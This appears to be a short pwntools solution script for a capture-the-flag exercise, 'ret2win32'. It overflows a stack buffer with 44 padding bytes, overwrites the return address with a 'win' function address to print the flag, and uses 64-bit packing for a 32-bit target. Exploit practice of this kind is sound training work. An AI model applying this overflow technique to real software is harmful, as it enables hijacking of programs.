from pwn import *

win = 0x0804862c
ret = 0x080485ac

payload = b"".join([
    b"A"*(32+12),
    p64(win),
])

p = process("./ret2win32")
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"flag:\n")
flag = p.recv()
print(f"Flag : {flag}")
